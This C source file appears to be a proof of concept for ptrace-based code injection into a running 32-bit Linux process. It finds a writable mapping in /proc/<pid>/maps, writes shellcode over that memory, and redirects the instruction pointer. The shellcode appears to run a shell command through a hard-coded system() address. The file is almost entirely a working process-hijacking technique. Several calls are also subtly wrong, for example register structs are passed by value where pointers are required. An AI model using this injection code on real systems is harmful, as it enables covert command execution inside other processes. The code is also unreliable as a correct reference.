#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/user.h>  
#include <sys/ptrace.h>
 
long targetAddr(pid_t pid){
        FILE *fp;
        char filename[30];
        char line[85];
        long addr;
        char str[20];
        sprintf(filename, "/proc/%d/maps", pid);
        fp=fopen(filename, "r");
        if(fp == 0)
                exit(1);
 
        while(fgets(line, 85, fp) != 0){
                printf("%s", line);
                sscanf(line, "%x-%*x %*s %*s %s", &addr, str, str, str, str);
 
        //break at first 00:00 (device value)
                if(strcmp(str, "00:00") == 0)
                        break;
 
        /*
        //break at stack area
        if(addr >= 0xbf000000)
            break;
        */
        }
        fclose(fp);
        return addr;
}
 
 
int main(int argc, char **argv){
        pid_t tracee;
        struct user_regs_struct oldregs,regs;
        long addr;
        long peek;
        int i;
 
        long injectcode[] = {
0x90909090,
0x6850c031,
0x7463656a,
0x69206568,
0x6320686e,
0x6568646f,
0x896f6863,
0x60bb50e0,
0xffb7e421,
0x18c483d3
};
        if(argc != 2){
                puts("argc error");
                exit(1);
        }
        tracee=atoi(argv[1]);
 
        ptrace(PTRACE_ATTACH, tracee, NULL, NULL);
        wait(NULL);
        ptrace(PTRACE_GETREGS, tracee, NULL,regs);
        printf("[old-eip = %p]\n", regs.eip);
        printf("\n------------\n");
 
        addr = targetAddr(tracee);
        printf("[new-eip(=addr=injection_point) = %p]\n", addr);
 
        memcpy(&oldregs,regs, sizeof(regs));
        regs.eip = addr+4;
 
        printf("=====%p's old data=====\n", addr);
        for(i = 0; i < sizeof(injectcode); i += sizeof(long)){
                peek = ptrace(PTRACE_PEEKDATA, tracee, addr+i, 0);
                printf("%x, ", peek);
        }
 
        for(i = 0; i < sizeof(injectcode); i += sizeof(long)){
                ptrace(PTRACE_POKEDATA, tracee, addr+i, injectcode[i/sizeof(long)]);
        }
 
        printf("\n=====%p's new data=====\n", addr);
        for(i = 0; i < sizeof(injectcode); i += sizeof(long)){
                peek = ptrace(PTRACE_PEEKDATA, tracee, addr+i, 0);
                printf("%x, ", peek);
        }
 
        ptrace(PTRACE_SETREGS, tracee, NULL,regs);
 
        ptrace(PTRACE_CONT, tracee, NULL, NULL);
        wait(NULL); // wait int3
 
        printf("\n...receive int3, restore original eip\n");
        ptrace(PTRACE_SETREGS, tracee, NULL, &oldregs);
 
        ptrace(PTRACE_DETACH, tracee, NULL, NULL);
 
}